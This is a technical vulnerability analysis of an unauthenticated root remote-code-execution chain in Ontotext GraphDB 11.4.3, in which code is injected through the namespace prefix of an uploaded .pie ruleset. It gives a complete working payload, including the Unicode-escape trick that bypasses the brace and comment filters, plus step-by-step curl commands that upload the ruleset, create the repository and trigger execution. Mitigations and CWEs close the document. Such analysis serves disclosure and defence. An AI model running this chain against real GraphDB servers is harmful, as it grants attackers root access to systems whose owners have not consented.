# Ontotext GraphDB .pie Ruleset Namespace Prefix Injection Unauthenticated Root RCE — Technical Analysis

## Overview

Ontotext GraphDB 11.4.3 Free edition defaults to `security=false`, which bypasses the entire Spring Security filter chain (`AdminDelegatingFilterProxy.doFilter` returns early when `securityConfig.hasToCheckAuthentication() == false`). As a result, `/rest/repositories/ruleset/upload` and `/repositories/*` are anonymously reachable (0 of 137 probed endpoints returned 401/403). A .pie ruleset upload is compiled at runtime by the system `javac` and loaded into the server process. `RuleCompilerBase.compilePrefices` (line 297) inlines the namespace prefix verbatim into the generated Java source with only `.trim()` and no validation. An attacker injects Java code in the prefix; creating a `graphdb:Sail` repository triggers `infer.initialize()`, which executes the injected `Runtime.exec` as the GraphDB process user (root). No authentication and no license are required. Dynamically verified with `uid=0(root)`.

This is a bypass variant of GDB-14528 (fixed in 11.4.1): the fix added ParsedIRI validation only on the axiom entity in `compileAxioms`, not on the namespace prefix in `compilePrefices`.

- **Authentication required**: None (anonymous)
- **Preconditions**: Default configuration (`security=false`); network reachability to the HTTP listener
- **Affected versions**: 11.4.3 (and earlier versions without prefix validation)
- **Privilege**: root (GraphDB process user, dynamically verified `uid=0(root)`)

## Authentication Boundary

```java
// AdminDelegatingFilterProxy.doFilter()
public void doFilter(ServletRequest request, ServletResponse response, FilterChain filterChain) {
    if (securityConfig.hasToCheckAuthentication() == false) {  // security=false default
        filterChain.doFilter(request, response);  // bypasses the whole Spring Security filter chain
        return;
    }
    // real auth logic (only when security=true)
}
```

With `security=false`, all 74 URL patterns in `security-config.xml` plus the ROLE_ADMIN/denyAll rules are ineffective. All `/rest/*` and `/repositories/*` endpoints are anonymously reachable.

## Stage 1: Sink Identification

GraphDB supports runtime upload of custom inference rulesets (.pie files), which are compiled by the built-in Java compiler into inferencer classes and loaded. `RuntimeInferencerCompilerBase.compileSource` uses `ToolProvider.getSystemJavaCompiler()` to compile the generated .java source and `loadClass` to load the compiled class. The generated class's `initialize()` method is invoked when the repository initializes; injecting `Runtime.getRuntime().exec(...)` into the `initialize()` body yields RCE.

## Stage 2: Source Identification

The .pie upload endpoint `RepositoryManagementController.uploadRuleSet` (`RepositoryManagementController.java:706-727`) is anonymously reachable (dynamic verification: HTTP 200 `{"success":true,"fileLocation":"..."}`). Upload compiles and loads the class (without initializing it).

`RuleCompilerBase.compilePrefices` (lines 272-301) is the only unvalidated injection point:

```java
String[] stringArray2 = string.split(": ");      // split on literal ": "
if (stringArray2.length != 2) { throw ... }
String string2 = stringArray2[0].trim();         // prefix - only .trim(), no validation
String string3 = stringArray2[1].trim();         // URI
try { new ParsedIRI(string3).isAbsolute(); }     // URI validated (blocks ")
catch (URISyntaxException ...) { throw ... }
if (hashSet.contains(string2)) continue;
this.output.println("\t\tnamespaces.put(\"" + string2 + "\", \"" + string3 + "\");");
//                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
//                  line 297 - prefix (string2) inlined verbatim, no escaping, no validation
```

All other injection vectors are blocked (verified exhaustively): `compileAxioms` validates entities via ParsedIRI; `compileRules`/`collectRules` validates rule identifiers via `checkCorrectIdentifierName`; `initNodes` sanitizes nodes via `toJavaIdentifier`. **Namespace prefix is the only unvalidated injection point.**

## Stage 3: Data Flow

```
.pie file (prefix contains injected code)
  -> RuleCompiler.compileFile (lines 137-200)
    -> removeRemarks (lines 1423-1443) strips // comments
    -> separateGroup (lines 1508-1519) regex extracts Prefices{} block
    -> compilePrefices (lines 272-301)
      -> split(": ") splits prefix / URI
      -> prefix only .trim(), no validation
      -> line 297: this.output.println("namespaces.put(\"" + prefix + "\", \"" + uri + "\");")
        -> writes .java file (PrintWriter + FileWriter)
  -> RuntimeInferencerCompilerBase.compileSource
    -> ToolProvider.getSystemJavaCompiler() (javac)
    -> FileBasedJavaObject.getCharContent reads .java file
    -> javac compiles -> .class
    -> loadClass (defineClass does not initialize)
  -> class cache (runtimeCustomInferencersCache)
  -> PUT /repositories/<id> creates graphdb:Sail repository
    -> OwlimSchemaRepository.initializeInternalNoCleanup (lines 357-430)
      -> line 397: createInferencer (newInstance, ctor does not call initialize)
      -> line 414: initInferencer
        -> line 1393: this.infer.initialize()  <- RCE trigger
          -> SwitchableInferencer.initialize (lines 399-405)
            -> abstractInferencer.initialize()  <- injected Runtime.exec runs
```

### License check happens after init (does not block)

`validateLicenseAndThrow` (`SailConnectionImpl.java:534-544`) runs at `startTransactionInternal` line 672 (transaction start). `OwlimSchemaRepository` contains 0 license checks (confirmed by grep). The init chain (createInferencer + initInferencer -> initialize) completes entirely before the license check.

## Stage 4: Injection / Exploit Construction

### Three gates (found by first-round falsifier)

1. **`removeRemarks` strips `//` comments** (lines 1436-1438): `Pattern.compile("//.*?\n")` strips all `//` line comments. An old payload using `//` leaves no `": "` -> split yields 1 element -> Syntax error -> 422.
2. **`separateGroup` regex broken by `}`** (line 1509): `Pattern.compile(string + "[ \\t\\n]*+\\{[^}]*+\\}")` — the possessive `[^}]*+` stops at the first `}`. A literal `}` in `try{...}catch{}` breaks the regex -> "Content found outside Prefices{}" -> 422.
3. **Checked-exception deadlock**: `Runtime.exec` throws checked IOException; the generated method signature `throws InferencerException` (line 2760) does not cover IOException, requiring try/catch -> requires `}` -> breaks separateGroup.

### Unicode-Escape bypass (substantive new mechanism)

Java Unicode Escape (JLS 3.3) is processed at the earliest compilation stage (UnicodeEscaping preprocessor, before lexical analysis). A literal 6-char sequence `\u007D` in the source becomes `}` in the compiled output. But GraphDB's .pie preprocessing (removeRemarks / separateGroup) operates on the raw text, treating `\u007D` as 6 ordinary characters (no literal `}`).

| Gate | Bypass |
|------|--------|
| 1. removeRemarks strips `//` | New payload uses NO `//`. `Arrays.asList("")` absorbs the trailing `", "http://x/");` (legal varargs call) |
| 2. separateGroup broken by `}` | Use `\u007B`/`\u007D` (6 literal chars) instead of literal braces. No literal `}` in .pie -> regex `[^}]*+` matches fully |
| 3. checked IOException | try/catch catches Exception, braces are Unicode Escapes. After javac processing, try/catch has real braces -> compiles; `throws InferencerException` no longer blocks |

### Payload

.pie prefix line (`\u007B`/`\u007D` are 6 literal ASCII chars, not Unicode chars):

```
evil", "http://x/");try{Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","id>/tmp/graphdb_pie_rce_marker"});}catch(Exception e){}Arrays.asList(" : http://x/
```

Generated Java (compilePrefices line 297 output, with literal `\u007B`/`\u007D`):

```java
		namespaces.put("evil", "http://x/");try{Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","id>/tmp/graphdb_pie_rce_marker"});}catch(Exception e){}Arrays.asList("", "http://x/");
```

After javac UnicodeEscaping:

```java
namespaces.put("evil", "http://x/");
try { Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","id>/tmp/graphdb_pie_rce_marker"}); }
catch(Exception e) {}
Arrays.asList("", "http://x/");
```

= 3 legal statements: 2-arg `put` + try/catch `exec` (RCE via `sh -c`) + `Arrays.asList` varargs (absorbs trailing).

## Dynamic Verification

Full chain (all anonymous, no auth, no license):

```bash
# Step 1: upload malicious .pie (anonymous)
curl -s -X POST http://localhost:7200/rest/repositories/ruleset/upload \
  -F "ruleset=@/tmp/evil_unicode.pie"
# -> {"success":true,"fileLocation":".../evil_unicodetmp<ts>.pie"}

# Step 2: create graphdb:Sail repository (anonymous, ruleset=fileLocation)
curl -s -X PUT -H "Content-Type: text/turtle" \
  --data-binary @/tmp/evil_rce_config.ttl \
  http://localhost:7200/repositories/evil_rce
# -> 204

# Step 3: trigger lazy init (anonymous) -> initialize() -> Runtime.exec
curl -s http://localhost:7200/repositories/evil_rce/size
# -> 0 (init executed)

# Step 4: verify marker
cat /tmp/graphdb_pie_rce_marker
# -> uid=0(root) gid=0(root) groups=0(root)
```

## Mitigation

1. Set `security=true` by default (or in every deployment) so the Spring Security filter chain is active
2. Validate/sanitize the namespace prefix in `RuleCompilerBase.compilePrefices` (not only `.trim()`)
3. Restrict ruleset upload and repository creation to authenticated administrators
4. Do not compile user-supplied rules with the system `javac` in the server process; sandbox or remove the runtime compiler
5. Do not run GraphDB as root; run under a dedicated low-privilege user

## CWEs

- CWE-94 (Improper Control of Generation of Code) - prefix inlined into generated Java source
- CWE-1336 (Improper Neutralization of Special Elements Used in a Template Engine) - namespace prefix injection
- CWE-306 (Missing Authentication for Critical Function) - security=false default bypasses auth
- CWE-250 (Execution with Unnecessary Privileges) - server runs as root
